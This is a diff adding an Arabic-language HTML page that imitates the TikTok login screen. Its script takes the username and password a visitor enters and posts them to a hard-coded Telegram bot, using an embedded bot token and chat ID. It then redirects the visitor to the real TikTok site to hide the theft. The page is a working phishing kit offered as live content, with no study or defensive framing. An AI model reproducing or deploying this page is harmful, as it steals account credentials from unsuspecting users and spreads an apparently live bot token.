@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول إلى TikTok</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
+        input, button { display: block; margin: 10px auto; padding: 10px; width: 80%; }
+        button { background: #ff2d55; color: white; border: none; }
+    </style>
+</head>
+<body>
+    <div class="tiktok-login">
+        <h1>تسجيل الدخول</h1>
+        <form id="loginForm">
+            <input type="text" name="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
+            <input type="password" name="password" placeholder="كلمة المرور" required>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const username = document.querySelector('input[name="username"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+            const telegramBotToken = '7650894113:AAGMahhmj2iha6B8FBDdKS_KJAiHzCx_aGY';
+            const chatId = '5109050054';
+            const message = `تسجيل دخول جديد:\nاسم المستخدم: ${username}\nكلمة المرور: ${password}`;
+            
+            await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            });
+            
+            window.location.href = 'https://www.tiktok.com';
+        });
+    </script>
+</body>
+</html>
